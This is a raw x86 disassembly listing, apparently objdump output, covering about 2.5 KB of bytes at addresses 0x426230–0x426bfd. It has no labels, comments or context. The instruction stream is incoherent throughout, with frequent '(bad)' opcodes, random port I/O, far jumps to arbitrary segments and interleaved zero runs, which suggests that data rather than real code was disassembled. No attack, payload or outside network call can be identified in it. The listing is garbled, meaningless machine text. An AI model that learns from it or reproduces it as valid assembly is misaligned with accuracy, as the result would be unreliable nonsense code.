  426230:	imul   ebx,DWORD PTR [ebp+0x9],0xffffffa1
  426234:	rol    ch,1
  426236:	aas    
  426237:	add    BYTE PTR ds:0xd3276a42,cl
  42623d:	mov    ds:0xda0d03fa,eax
  426242:	fsub   QWORD PTR [ebx]
  426244:	add    DWORD PTR [edi-0x18],edx
  426247:	jecxz  0x42623c
  426249:	push   esi
  42624a:	add    ch,bh
  42624c:	add    BYTE PTR [ebx+0xe],dh
  42624f:	inc    eax
  426250:	or     eax,0x9652ad12
  426255:	sti    
  426256:	jg     0x426243
  426258:	sbb    eax,0xe343e6aa
  42625d:	loope  0x4262b7
  42625f:	out    0x6c,eax
  426261:	sub    BYTE PTR [ecx],al
  426263:	add    BYTE PTR [esi+0xbc508a4],dl
  426269:	pop    eax
  42626a:	add    BYTE PTR [eax],al
  42626c:	or     eax,0x8803bae0
  426271:	div    WORD PTR [eax]
  426274:	inc    ebx
  426275:	call   0x36c:0xd9ed7302
  42627c:	ret    
  42627d:	jno    0x426202
  42627f:	cmp    al,0xa5
  426281:	push   esi
  426282:	hlt    
  426283:	jmp    DWORD PTR [ecx-0x4817acb7]
  426289:	push   esi
  42628a:	mov    ebp,0x50
	...
  4262a7:	add    BYTE PTR [eax],al
  4262a9:	add    dl,al
  4262ab:	rol    BYTE PTR [ebx],0x87
  4262ae:	mov    bl,0x72
  4262b0:	pop    eax
  4262b1:	xor    ah,BYTE PTR [ebx+0x57]
  4262b4:	add    cl,ch
  4262b6:	and    eax,0x62fcc4e4
  4262bb:	loopne 0x426286
  4262bd:	or     esp,ebp
  4262bf:	mov    ebx,0x91eaff8b
  4262c4:	std    
  4262c5:	mov    dl,BYTE PTR [ebx+0x63]
  4262c8:	ror    DWORD PTR [edi-0x1b],cl
  4262cb:	inc    edx
  4262cc:	push   es
  4262cd:	call   edx
  4262cf:	jmp    FWORD PTR [edi-0x36]
  4262d2:	adc    al,BYTE PTR [ebx+0x3209f926]
  4262d8:	daa    
  4262d9:	pop    ebp
  4262da:	mov    edi,0x8603e6ff
  4262df:	(bad)
  4262e2:	(bad)  
  4262e3:	ins    BYTE PTR es:[edi],dx
  4262e4:	in     eax,dx
  4262e5:	mov    BYTE PTR [edi-0x1],ch
  4262e8:	out    0x3,al
  4262ea:	and    eax,0x8d03e721
  4262ef:	ins    BYTE PTR es:[edi],dx
  4262f0:	fwait
  4262f1:	sti    
  4262f2:	jb     0x42632e
  4262f4:	in     eax,0x4
  4262f6:	or     eax,0xaca5fd5
  4262fb:	jnp    0x4262a0
  4262fd:	outs   dx,DWORD PTR ds:[esi]
  4262fe:	ret    0xab7a
  426301:	jae    0x4262dd
  426303:	fxch   st(3)
  426305:	jb     0x4262e6
  426307:	imul   DWORD PTR ds:0xe6f656c9
  42630d:	add    eax,DWORD PTR [eax]
	...
  42632b:	add    BYTE PTR ds:0x1f43fb6d,cl
  426331:	shl    dh,0x86
  426334:	cmp    bh,dh
  426336:	pop    ebx
  426337:	sbb    BYTE PTR [edx],al
  426339:	ret    
  42633a:	retf   0x1f9
  42633d:	add    BYTE PTR [ebx+0x74],0xda
  426341:	repnz inc ecx
  426343:	xchg   DWORD PTR [edi+0x66f8ea6b],esp
  426349:	ja     0x42636f
  42634b:	or     al,0x86
  42634d:	(bad)
  426350:	jb     0x426353
  426352:	out    0x3,eax
  426354:	lea    ebp,[ebx+0x1b]
  426357:	cld    
  426358:	repnz test ebp,esp
  42635b:	add    al,0xd
  42635d:	jns    0x42638b
  42635f:	adc    BYTE PTR [ebp+eax*8+0x6b4a80d6],dl
  426366:	jmp    DWORD PTR [edi+0x69]
  426369:	ins    BYTE PTR es:[edi],dx
  42636a:	cld    
  42636b:	fimul  WORD PTR [esi]
  42636d:	cmc    
  42636e:	or     dh,BYTE PTR [edx-0x33]
  426371:	test   DWORD PTR [edx-0x78fa45d0],0x4582f2a7
  42637b:	add    ebx,edx
  42637d:	pop    es
  42637e:	std    
  42637f:	mov    esp,0xe4fd63a6
  426384:	or     DWORD PTR [eax],eax
  426386:	mov    DWORD PTR [ecx],edx
  426388:	test   DWORD PTR [eax+0x73],ecx
  42638b:	xchg   edi,eax
  42638c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42638d:	cmp    BYTE PTR [eax],0xe9
	...
  4263ac:	add    BYTE PTR [eax],al
  4263ae:	cmp    BYTE PTR [ebx-0x12000397],0x7
  4263b5:	add    esi,edx
  4263b7:	std    
  4263b8:	(bad)  
  4263b9:	call   0xc5b60f43
  4263be:	je     0x426340
  4263c0:	aaa    
  4263c1:	jmp    0x97c99920
  4263c6:	cli    
  4263c7:	add    BYTE PTR [ebp-0x47],0xb3
  4263cb:	sub    ch,bh
  4263cd:	pop    esp
  4263ce:	dec    ecx
  4263cf:	arpl   WORD PTR [edx-0x1c],bx
  4263d2:	sldt   WORD PTR [edi+0x4542212f]
  4263d9:	icebp  
  4263da:	push   cs
  4263db:	pop    ecx
  4263dc:	mov    edx,0x445b3a69
  4263e1:	out    dx,al
  4263e2:	mov    edx,DWORD PTR [esi]
  4263e4:	std    
  4263e5:	mov    dh,0x9c
  4263e7:	jg     0x426463
  4263e9:	lods   eax,DWORD PTR ds:[esi]
  4263ea:	or     ch,bh
  4263ec:	or     dl,0x7d
  4263ef:	ins    BYTE PTR es:[edi],dx
  4263f0:	cld    
  4263f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4263f2:	xlat   BYTE PTR ds:[ebx]
  4263f3:	adc    al,BYTE PTR [eax]
  4263f5:	cmp    dh,0x6b
  4263f8:	cld    
  4263f9:	mov    ds,ecx
  4263fb:	bound  ebp,QWORD PTR [ebx+0x44300]
  426401:	push   ebx
  426402:	jl     0x426399
  426404:	stos   DWORD PTR es:[edi],eax
  426405:	add    ah,ah
  426407:	(bad)  
  426408:	shl    bl,1
  42640a:	vpcmpeqb k5{k6},zmm7,ZMMWORD PTR [esi+0x5afd]
	...
  426430:	std    
  426431:	ror    DWORD PTR [eax],0x0
  426434:	jns    0x426421
  426436:	call   0x801eacbe
  42643b:	in     al,dx
  42643c:	shr    bl,1
  42643e:	inc    ecx
  42643f:	adc    al,0x87
  426441:	dec    eax
  426442:	push   ebx
  426443:	call   DWORD PTR [ebx+ebp*8+0x33e31041]
  42644a:	xchg   DWORD PTR [ebp-0x80],eax
  42644d:	out    dx,eax
  42644e:	jno    0x426458
  426450:	imul   DWORD PTR [esp+edi*8]
  426453:	mov    ebx,DWORD PTR ds:0x902470eb
  426459:	in     eax,0x58
  42645b:	and    al,0x54
  42645d:	(bad)  
  42645e:	push   0x80ef63fe
  426463:	shl    BYTE PTR [ebx-0x7e],0x1a
  426467:	add    ah,BYTE PTR [esi+edi*8-0x7a]
  42646b:	inc    ebp
  42646c:	cmp    al,0xc6
  42646e:	pop    esi
  42646f:	cmc    
  426470:	arpl   di,bp
  426472:	test   BYTE PTR [eax+ecx*1+0x1],al
  426476:	xchg   esi,eax
  426478:	hlt    
  426479:	retf   
  42647a:	rol    BYTE PTR [ecx+0x4485ef53],0x8
  426481:	cld    
  426482:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426483:	add    eax,ebx
  426485:	adc    ch,BYTE PTR [eax+0x78]
  426488:	adc    edi,esi
  42648a:	(bad)  
  42648b:	dec    BYTE PTR [ecx]
  42648d:	xor    dl,BYTE PTR [edx]
  42648f:	inc    eax
  426490:	hlt    
  426491:	test   BYTE PTR [eax+0x24],ah
	...
  4264b0:	add    BYTE PTR [eax],al
  4264b2:	or     eax,0xe0e7006b
  4264b7:	pop    eax
  4264b8:	add    BYTE PTR [eax],al
  4264ba:	mov    ch,0x55
  4264bc:	inc    DWORD PTR [ebx+0x588f]
  4264c2:	mov    ?,ebx
  4264c4:	daa    
  4264c5:	adc    BYTE PTR ds:0xd34576a6,cl
  4264cb:	fwait
  4264cc:	and    al,0xe
  4264ce:	or     al,0x20
  4264d0:	clc    
  4264d1:	and    edi,DWORD PTR [ecx]
  4264d3:	dec    esp
  4264d4:	mov    edx,0xec034188
  4264d9:	and    BYTE PTR [ebx+ebx*2],0x0
  4264dd:	je     0x42652c
  4264df:	fadd   st(4),st
  4264e1:	and    ecx,DWORD PTR [ebp-0x1c]
  4264e4:	in     al,dx
  4264e5:	and    ebp,ecx
  4264e7:	mov    esi,0x228a8f0c
  4264ec:	test   DWORD PTR [edi+0x437d50f9],edi
  4264f2:	xor    DWORD PTR [edi-0x30],eax
  4264f5:	out    0x5c,eax
  4264f7:	sbb    eax,0xeb6afc6f
  4264fc:	and    al,0x28
  4264fe:	jne    0x426502
  426500:	lahf   
  426501:	call   FWORD PTR [edx+0x72]
  426504:	cmc    
  426505:	and    ebx,DWORD PTR ds:0x1e04125a
  42650b:	pop    ss
  42650c:	add    al,0x89
  42650e:	leave  
  42650f:	add    ah,BYTE PTR [eax]
  426511:	xchg   ecx,edx
  426513:	cli    
  426514:	adc    eax,DWORD PTR [ebx+0x0]
	...
  426532:	add    BYTE PTR [eax],al
  426534:	dec    ebp
  426535:	sar    esi,cl
  426537:	xchg   BYTE PTR [ecx-0x5616e806],ah
  42653d:	(bad)  
  42653e:	out    dx,eax
  42653f:	and    ecx,DWORD PTR [edx]
  426541:	push   edi
  426542:	test   DWORD PTR [ebx+ecx*2],0xd0e2823
  426549:	add    BYTE PTR [edx+0x6c1f74d6],dl
  42654f:	lock sbb BYTE PTR cs:[edi],ch
  426553:	pop    esp
  426554:	retf   
  426555:	xor    esp,edi
  426557:	add    edx,DWORD PTR [edx+esi*1+0x4d193b]
  42655e:	(bad)  
  426560:	or     eax,0x85d34700
  426565:	inc    eax
  426566:	push   ss
  426567:	outs   dx,DWORD PTR ds:[esi]
  426568:	aas    
  426569:	clc    
  42656a:	gs push esi
  42656c:	xor    al,0x24
  42656e:	ins    BYTE PTR es:[edi],dx
  42656f:	lock out dx,al
  426571:	pop    ds
  426572:	scas   eax,DWORD PTR es:[edi]
  426573:	pop    ebx
  426574:	imul   esi,DWORD PTR [ebx],0xffffffe7
  426577:	add    esp,DWORD PTR [edi+edi*8-0x1a]
  42657b:	add    ecx,DWORD PTR [ebp-0x7a912f34]
  426581:	inc    eax
  426582:	xchg   esi,eax
  426583:	outs   dx,BYTE PTR ds:[esi]
  426584:	pop    ds
  426585:	clc    
  426586:	sub    eax,0x7421f456
  42658b:	lock sbb BYTE PTR cs:[edi-0x18cc78a5],bh
  426593:	add    ebx,esp
  426595:	aad    0xd
  426597:	jnp    0x426599
	...
  4265b5:	add    BYTE PTR [ecx-0x31],dl
  4265b8:	add    eax,0x14690af9
  4265bd:	add    DWORD PTR [ebp+0x68],0x35
  4265c1:	rol    BYTE PTR [esi-0x44],0xe6
  4265c5:	(bad)  
  4265c6:	dec    ecx
  4265c7:	adc    bh,bh
  4265c9:	adc    ebp,ecx
  4265cb:	jmp    DWORD PTR [esi-0x11]
  4265ce:	out    dx,al
  4265cf:	stc    
  4265d0:	out    0xfe,al
  4265d2:	mov    ?,WORD PTR [esi-0x1a]
  4265d5:	add    ecx,DWORD PTR ds:0x2afc3b75
  4265db:	push   es
  4265dc:	mov    eax,0x24196e
  4265e1:	stos   BYTE PTR es:[edi],al
  4265e2:	adc    eax,0x45c155f6
  4265e7:	push   edi
  4265e8:	cld    
  4265e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4265ea:	aaa    
  4265eb:	inc    ecx
  4265ec:	jae    0x426600
  4265ee:	jbe    0x426647
  4265f0:	sahf   
  4265f1:	or     eax,0x1ffc04d
  4265f6:	arpl   WORD PTR [edi],bx
  4265f8:	std    
  4265f9:	std    
  4265fa:	push   ds
  4265fb:	adc    BYTE PTR [ecx-0x17f3dedb],cl
  426601:	inc    esi
  426602:	lea    esp,[esp+edi*8+0x48]
  426606:	mov    dl,0x3b
  426608:	inc    eax
  426609:	jmp    0x1485941
  42660e:	pop    ecx
  42660f:	adc    ch,BYTE PTR [esi+0x63870ee9]
  426615:	sbb    eax,0xcd8167cf
	...
  426636:	add    BYTE PTR [eax],al
  426638:	or     BYTE PTR [eax],cl
  42663a:	add    BYTE PTR [eax-0x16bfc44e],cl
  426640:	(bad)  
  426641:	jecxz  0x426648
  426643:	or     DWORD PTR [ecx],edx
  426645:	xchg   DWORD PTR [ebx+0x35],esp
  426648:	dec    edi
  426649:	xchg   DWORD PTR [di+0x410],edi
  42664e:	lahf   
  42664f:	lea    esi,[edx]
  426651:	sar    bh,0x61
  426654:	stos   BYTE PTR es:[edi],al
  426655:	and    edi,DWORD PTR [eax+0x70]
  426658:	mov    ds:0x72480ffd,al
  42665d:	cmp    eax,DWORD PTR [eax-0x17]
  426660:	xlat   BYTE PTR ds:[ebx]
  426661:	mov    edx,0xbac96d23
  426666:	add    eax,0xcbe36ffd
  42666b:	sub    dl,BYTE PTR [ecx]
  42666d:	jns    0x4266ba
  42666f:	or     eax,0xe74b7f19
  426674:	repnz pop eax
  426676:	pop    ds
  426677:	add    BYTE PTR [ebx+0x68],cl
  42667a:	and    BYTE PTR [eax-0x61],bh
  42667d:	ja     0x42669f
  42667f:	and    BYTE PTR [ebx+eax*1],0x0
  426683:	call   0x3e4db7
  426688:	ja     0x4266fa
  42668a:	and    BYTE PTR [eax],dl
  42668c:	in     al,0x6e
  42668e:	add    eax,0x101810ff
  426693:	call   0x3f5ee5
  426698:	add    edx,ebp
  42669a:	adc    DWORD PTR [eax+eax*1],ebx
	...
  4266b9:	add    BYTE PTR [esi-0x1e1503be],dh
  4266bf:	xchg   ebx,eax
  4266c0:	dec    eax
  4266c1:	int3   
  4266c2:	idiv   ebx
  4266c4:	cmc    
  4266c5:	inc    esp
  4266c6:	adc    ah,dh
  4266c8:	add    esi,DWORD PTR [ebx+eax*4-0x19]
  4266cc:	inc    eax
  4266cd:	and    al,0xc0
  4266cf:	out    0x49,eax
  4266d1:	adc    BYTE PTR ds:0x10448703,ch
  4266d7:	inc    esp
  4266d8:	xchg   DWORD PTR [ebp-0x40],ecx
  4266db:	dec    ebx
  4266dc:	test   DWORD PTR [ecx],eax
  4266de:	fisttp DWORD PTR [esi]
  4266e0:	sbb    BYTE PTR [edx],dl
  4266e2:	mov    ah,0x2
  4266e4:	xchg   DWORD PTR [ebp+0x7c],esi
  4266e7:	retf   0xf046
  4266ea:	sbb    edx,ebp
  4266ec:	aaa    
  4266ed:	ret    
  4266ee:	xchg   ecx,eax
  4266ef:	push   0xf292e852
  4266f4:	sti    
  4266f5:	dec    DWORD PTR [edi-0x41]
  4266f8:	jo     0x42671b
  4266fa:	fucomip st,st(3)
  4266fc:	popf   
  4266fd:	sub    BYTE PTR fs:[ecx-0x4],al
  426701:	push   0x42
  426703:	or     bh,bl
  426705:	je     0x426739
  426707:	data16 in al,0x58
  42670a:	mov    DWORD PTR [edx],eax
  42670c:	add    BYTE PTR [ebx+0x6428150d],cl
  426712:	xchg   esi,eax
  426713:	inc    ebx
  426714:	in     al,0xcb
  426716:	into   
  426717:	pop    eax
  426718:	jns    0x42675d
  42671a:	or     edx,DWORD PTR [ebp-0x2d]
  42671d:	cld    
	...
  42673a:	add    BYTE PTR [eax],al
  42673c:	clc    
  42673d:	dec    esp
  42673e:	push   cs
  42673f:	inc    eax
  426740:	or     eax,0x4d23c4c4
  426745:	(bad)  
  426746:	in     al,0x8b
  426748:	cli    
  426749:	xchg   BYTE PTR [edi+0x43],dh
  42674c:	sub    DWORD PTR [ebx-0x35],esp
  42674f:	pop    ebp
  426750:	inc    esi
  426751:	loop   0x4267b8
  426753:	pop    edx
  426754:	iret   
  426755:	inc    edi
  426756:	add    BYTE PTR [ebx-0x7a],dl
  426759:	jae    0x4267b3
  42675b:	push   edx
  42675c:	cli    
  42675d:	push   edi
  42675e:	add    BYTE PTR [ebp+ecx*8-0x1aa3f95],al
  426765:	les    ebp,FWORD PTR [ecx]
  426767:	jae    0x426786
  426769:	dec    ebx
  42676a:	or     esi,DWORD PTR [edi]
  42676c:	cmp    BYTE PTR [ebx-0xc],bl
  42676f:	sbb    DWORD PTR ds:0x6d000057,esi
  426775:	mov    esi,0xac9a0ff5
  42677a:	cld    
  42677b:	cld    
  42677c:	sbb    BYTE PTR [edi+0x6b],bl
  42677f:	adc    cl,BYTE PTR [ecx]
  426781:	dec    esp
  426782:	sar    bh,0x95
  426785:	test   BYTE PTR [eax],dl
  426787:	xchg   DWORD PTR [eax],eax
  426789:	push   ebx
  42678a:	jge    0x4267ce
  42678c:	adc    eax,0x1427da7
  426791:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426792:	sar    ah,cl
  426794:	fsubr  DWORD PTR [esi+0x2f]
  426797:	(bad)  
  426798:	xchg   DWORD PTR gs:[ebp-0x4],ebp
  42679c:	push   edx
  42679d:	lea    edi,[edi-0x9]
	...
  4267bc:	add    BYTE PTR [eax],al
  4267be:	dec    edx
  4267bf:	in     al,dx
  4267c0:	add    ebx,DWORD PTR [ebx+0x42]
  4267c3:	add    BYTE PTR [esp+edi*2],cl
  4267c6:	pop    ds
  4267c7:	shl    dh,0xc8
  4267ca:	dec    esp
  4267cb:	or     al,0xe7
  4267cd:	rcl    BYTE PTR [ebp-0x79541ac],1
  4267d3:	(bad)  
  4267d4:	out    0x7f,al
  4267d6:	pop    edx
  4267d7:	in     al,dx
  4267d8:	es rcr ch,cl
  4267db:	ins    DWORD PTR es:[edi],dx
  4267dc:	out    dx,eax
  4267dd:	lock sbb ch,ah
  4267e0:	int    0x2c
  4267e2:	jle    0x4267d8
  4267e4:	sbb    cl,BYTE PTR [esi]
  4267e6:	gs add bh,ah
  4267e9:	add    ebp,DWORD PTR [ebp-0x17ebe49c]
  4267ef:	jmp    0x1185:0xf85f6ada
  4267f6:	mov    eax,ds:0x8a04270a
  4267fb:	jmp    0xc15b:0xf43f7cd6
  426802:	sbb    dl,al
  426804:	jae    0x4267c7
  426806:	push   ds
  426807:	shl    BYTE PTR [edx+ebp*2+0x3d19f83f],1
  42680e:	mov    dl,0x66
  426810:	dec    edx
  426811:	imul   esp,DWORD PTR [ecx-0x6693963b],0xffffffea
  426818:	in     eax,0xc8
  42681a:	xchg   ecx,eax
  42681b:	sbb    dh,BYTE PTR [edi+0x11]
  42681e:	int    0xff
  426820:	mov    eax,DWORD PTR [ebp+0x0]
	...
  42683f:	add    BYTE PTR [esi],bl
  426841:	add    BYTE PTR [esi+edi*2+0x6c028066],bh
  426848:	lea    edx,[ebx-0x3e]
  42684b:	shl    DWORD PTR [edx-0x61],1
  42684e:	hlt    
  42684f:	add    al,0xd
  426851:	jl     0x426879
  426853:	lock fbstp TBYTE PTR [eax]
  426856:	cmc    
  426857:	(bad)  [edx]
  426859:	jae    0x42685a
  42685b:	lods   al,BYTE PTR ds:[esi]
  42685c:	sub    dh,ah
  42685e:	ss je  0x42689b
  426861:	icebp  
  426862:	adc    bh,BYTE PTR [edi]
  426864:	popa   
  426865:	arpl   WORD PTR [edx],dx
  426867:	cmp    DWORD PTR [edi],ebx
  426869:	sar    bh,0x69
  42686c:	jmp    0x27f7:0xed25c4f8
  426873:	jmp    0xfb2b6886
  426878:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426879:	icebp  
  42687a:	or     ebx,DWORD PTR [ecx]
  42687c:	imul   esp,esi,0x2b0ee9ab
  426882:	je     0x426851
  426884:	or     ch,ah
  426886:	and    esp,eax
  426888:	loop   0x4268a9
  42688a:	adc    BYTE PTR ds:0xe8ffd817,bl
  426890:	push   cs
  426891:	mov    al,ds:0x7fafdfc
  426896:	std    
  426897:	cmc    
  426898:	repnz pop es
  42689a:	std    
  42689b:	cld    
  42689c:	(bad)  
  42689d:	fs adc ch,ch
  4268a0:	sbb    eax,0x6fffc0
	...
  4268c1:	add    BYTE PTR [edx-0x5d8fefe1],ch
  4268c7:	pop    ds
  4268c8:	adc    al,0x64
  4268ca:	push   0x1f
  4268cc:	and    BYTE PTR [ecx+0x923bf25],bh
  4268d2:	ror    ebp,0xfc
  4268d5:	mov    ah,0x96
  4268d7:	xor    bh,al
  4268d9:	inc    ecx
  4268da:	imul   esp,DWORD PTR [edi-0x4],0x2e
  4268de:	mov    ebp,DWORD PTR [ebx-0x4]
  4268e1:	pushf  
  4268e2:	adc    dh,BYTE PTR [edi+0x43]
  4268e5:	lds    esi,FWORD PTR [esi+0x58]
  4268e8:	add    BYTE PTR [edx+0x4d],ah
  4268eb:	idiv   esp
  4268ed:	xchg   esp,eax
  4268ee:	push   ss
  4268ef:	gs jb  0x4268f2
  4268f2:	cmp    dh,dl
  4268f4:	jno    0x426906
  4268f6:	je     0x4268ce
  4268f8:	jno    0x426902
  4268fa:	inc    ebx
  4268fb:	repz lahf 
  4268fd:	adc    eax,0x8b5dff74
  426902:	dec    ecx
  426903:	cmp    edi,DWORD PTR [esi-0x78cddbec]
  426909:	in     al,dx
  42690a:	mov    bh,0xdf
  42690c:	hlt    
  42690d:	and    DWORD PTR [eax+0x8],0x56
  426911:	call   0x3f5c65
  426916:	test   al,0xbb
  426918:	jo     0x42698f
  42691a:	pop    es
  42691b:	icebp  
  42691c:	data16 sub BYTE PTR [ecx+0x40],ah
  426920:	and    BYTE PTR [ebp*8+0x750851],cl
	...
  426943:	add    cl,bh
  426945:	push   eax
  426946:	dec    esp
  426947:	(bad)  
  426948:	jmp    0xf4827b9b
  42694d:	jnp    0x42690f
  42694f:	or     al,0xab
  426951:	aas    
  426952:	and    BYTE PTR [eax],cl
  426954:	mov    esp,0x8ffffffe
  426959:	sub    al,0xfb
  42695b:	jne    0x42693d
  42695d:	dec    esi
  42695e:	in     al,0xd8
  426960:	lahf   
  426961:	sti    
  426962:	(bad)  
  426963:	cmp    al,bl
  426965:	add    dl,BYTE PTR [esp+esi*2]
  426968:	sbb    BYTE PTR [edi],dl
  42696a:	je     0x426990
  42696c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42696d:	push   edx
  42696e:	sbb    ch,BYTE PTR [eax-0x5c]
  426971:	(bad)  
  426972:	call   FWORD PTR [edi+0x18206fd3]
  426978:	inc    ebx
  426979:	jo     0x42699b
  42697b:	sbb    BYTE PTR [ebx],dh
  42697d:	push   ebx
  42697e:	add    al,0xff
  426980:	jns    0x426914
  426982:	adc    DWORD PTR [eax+0x64],eax
  426985:	in     eax,0x70
  426987:	and    al,0xd
  426989:	imul   edi,DWORD PTR [ecx+0x73],0x43756d29
  426990:	xor    DWORD PTR [ecx],edi
  426992:	ror    BYTE PTR [edx+0x50203cc9],1
  426998:	jecxz  0x426a03
  42699a:	in     eax,dx
  42699b:	pop    es
  42699c:	(bad)  
  42699d:	pop    ds
  42699e:	pop    esp
  42699f:	lds    esi,FWORD PTR [esi]
  4269a1:	pop    ecx
  4269a2:	xor    BYTE PTR [di],0x41
  4269a6:	in     eax,dx
  4269a7:	sbb    eax,DWORD PTR [eax]
	...
  4269c5:	add    BYTE PTR [eax+0x36082014],bl
  4269cb:	push   ebp
  4269cc:	jnp    0x426a10
  4269ce:	or     DWORD PTR [edx],edi
  4269d0:	in     eax,dx
  4269d1:	pop    ss
  4269d2:	adc    ch,BYTE PTR [ebx]
  4269d4:	adc    ch,bh
  4269d6:	add    BYTE PTR [edi-0x30],0xfc
  4269da:	js     0x426a3b
  4269dc:	adc    dh,BYTE PTR [bx+di-0x3f9c]
  4269e1:	call   DWORD PTR [eax-0x12]
  4269e4:	pop    ebp
  4269e5:	pop    edx
  4269e6:	iret   
  4269e7:	arpl   WORD PTR [eax],ax
  4269e9:	push   ecx
  4269ea:	cmp    ebx,esi
  4269ec:	in     al,dx
  4269ed:	and    ecx,DWORD PTR [ecx]
  4269ef:	add    DWORD PTR [edi+0x12],esp
  4269f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269f3:	dec    esp
  4269f4:	sar    bh,0x97
  4269f7:	(bad)  
  4269f8:	pop    eax
  4269f9:	dec    esi
  4269fa:	sbb    BYTE PTR [eax+0x0],bl
  4269fd:	test   ch,cl
  4269ff:	inc    ebx
  426a00:	sbb    al,0x55
  426a02:	jb     0x426997
  426a04:	xor    al,0x40
  426a06:	or     eax,0x51267a2
  426a0b:	gs sar bh,0xb2
  426a0f:	sbb    edx,DWORD PTR [esi-0x4]
  426a12:	xchg   edx,eax
  426a13:	(bad)  
  426a14:	push   0x585401fc
  426a19:	xchg   edi,eax
  426a1a:	jae    0x426a2e
  426a1c:	push   0xfc007a54
  426a21:	pop    es
  426a22:	pop    ds
  426a23:	shl    dh,0xc8
  426a26:	enter  0x2974,0xcc
	...
  426a46:	add    BYTE PTR [eax],al
  426a48:	dec    esp
  426a49:	cld    
  426a4a:	out    0xce,al
  426a4c:	test   DWORD PTR [esi+ecx*1+0xd],edx
  426a50:	(bad)  
  426a51:	(bad)  
  426a52:	out    0x7f,al
  426a54:	mov    ch,ah
  426a56:	mov    edi,0xa4274d34
  426a5b:	idiv   DWORD PTR [esi+0x2c1201d]
  426a61:	jmp    0xc5b:0xbce2cfb
  426a68:	mov    ebp,0xfef1cdcf
  426a6d:	jb     0x426a9a
  426a6f:	cld    
  426a70:	adc    ebx,ebp
  426a72:	(bad)  
  426a73:	data16 jg 0x426a6a
  426a76:	mov    esi,0xad60f9bd
  426a7b:	add    DWORD PTR [edx],0x61
  426a7e:	sbb    edi,edi
  426a80:	push   edi
  426a81:	popa   
  426a82:	ret    
  426a83:	xchg   ebx,eax
  426a84:	(bad)  
  426a85:	mov    edi,0xfccc8e6
  426a8a:	out    0xd0,eax
  426a8c:	test   DWORD PTR [ebx+0x1c],edx
  426a8f:	pop    esp
  426a90:	mov    ebx,0x9403e80b
  426a95:	jmp    0x80bf:0xeb827fe2
  426a9c:	shr    bl,0xb
  426a9f:	jnp    0x426af9
  426aa1:	or     al,0x64
  426aa3:	push   edx
  426aa4:	push   ds
  426aa5:	add    ah,BYTE PTR [esi+edi*4-0x6]
  426aa9:	je     0x426a89
  426aab:	add    BYTE PTR [eax],0x0
	...
  426aca:	shr    ebx,cl
  426acc:	(bad)  [esi+0x1f]
  426acf:	or     al,0xd1
  426ad1:	add    al,0xdd
  426ad3:	into   
  426ad4:	call   FWORD PTR [edx+0x4107be05]
  426ada:	or     al,0x6b
  426adc:	cld    
  426add:	mov    gs,WORD PTR es:[eax-0x4]
  426ae1:	xchg   esp,eax
  426ae2:	(bad)  
  426ae3:	bound  esi,QWORD PTR [edx-0x3]
  426ae6:	jmp    0x426ad5
  426ae8:	movzx  esi,bx
  426aeb:	in     eax,dx
  426aec:	pop    es
  426aed:	push   es
  426aee:	cld    
  426aef:	mov    edx,DWORD PTR [edx]
  426af1:	test   eax,0x2b5ac20e
  426af6:	sbb    DWORD PTR [eax],eax
  426af8:	push   ebx
  426af9:	(bad)  
  426afa:	aad    0x58
  426afc:	mov    edi,ebp
  426afe:	or     DWORD PTR [eax],eax
  426b00:	test   BYTE PTR [ecx+0x5cfd093a],ch
  426b06:	std    
  426b07:	je     0x426b4b
  426b09:	loope  0x426b3f
  426b0b:	(bad)  
  426b0c:	cld    
  426b0d:	cmp    al,0x15
  426b0f:	(bad)  
  426b10:	call   DWORD PTR [edx+0x11]
  426b13:	push   0x5c6bbfc8
  426b18:	xor    BYTE PTR [ecx+0x4404d273],0x6a
  426b1f:	and    bl,BYTE PTR [eax+0x5b5fcef4]
  426b25:	stos   DWORD PTR es:[edi],eax
  426b26:	(bad)  
  426b27:	call   DWORD PTR [edx+0x62]
  426b2a:	inc    edx
  426b2b:	addr16 pop ebx
  426b2d:	fld    QWORD PTR [eax]
	...
  426b4b:	add    BYTE PTR [ecx],cl
  426b4d:	add    BYTE PTR [ecx+ebp*4+0x1e55c1ba],al
  426b54:	push   0xffffffcb
  426b56:	retf   
  426b57:	sub    dl,BYTE PTR [ecx]
  426b59:	mov    ch,0xfc
  426b5b:	cld    
  426b5c:	push   es
  426b5d:	repnz aas 
  426b5f:	jmp    0x414a3d8b
  426b64:	das    
  426b65:	imul   edi,esp,0x4e
  426b68:	(bad)  
  426b69:	push   edi
  426b6a:	cld    
  426b6b:	add    BYTE PTR [eax+0x5],dl
  426b6e:	rcr    BYTE PTR [si],0x3
  426b72:	add    DWORD PTR [eax+ebp*1+0x42],esp
  426b76:	cld    
  426b77:	cmp    BYTE PTR [edi+ecx*1-0x25848b03],0x44
  426b7f:	adc    bh,dh
  426b81:	imul   eax,DWORD PTR [eax],0x0
  426b84:	sbb    BYTE PTR [ebp-0x79],0x40
  426b88:	push   eax
  426b89:	fadd   QWORD PTR [ecx+0x8]
  426b8c:	jae    0x426b74
  426b8e:	adc    DWORD PTR [esi+eiz*2],ebx
  426b91:	inc    ebx
  426b92:	cld    
  426b93:	pop    esi
  426b94:	call   0x3fef:0xe425fb48
  426b9b:	add    BYTE PTR [edx+ebx*2+0x10],bl
  426b9f:	add    DWORD PTR [edi+ebx*8],esi
  426ba2:	mov    esp,0x48d82d74
  426ba7:	and    al,0x2c
  426ba9:	mov    ebx,0xe54beeb0
  426bae:	sti    
  426baf:	and    eax,0x0
	...
  426bcc:	add    BYTE PTR [eax],al
  426bce:	je     0x426bdf
  426bd0:	inc    eax
  426bd1:	add    ah,cl
  426bd3:	ror    DWORD PTR [edi],1
  426bd5:	add    esp,esp
  426bd7:	fidivr WORD PTR [esp+esi*2+0x2448d7fd]
  426bde:	fdivr  QWORD PTR [edx-0x1b841168]
  426be4:	sti    
  426be5:	and    eax,0x400f68
  426bea:	icebp  
  426beb:	fsubr  st,st(0)
  426bed:	or     ecx,0x56
  426bf0:	std    
  426bf1:	je     0x426bd6
  426bf3:	jg     0x426c6e
  426bf5:	adc    al,0xb0
  426bf7:	ins    DWORD PTR es:[edi],dx
  426bf8:	or     eax,0xfcf0ffe8
  426bfd:	push   DWORD PTR [eax]
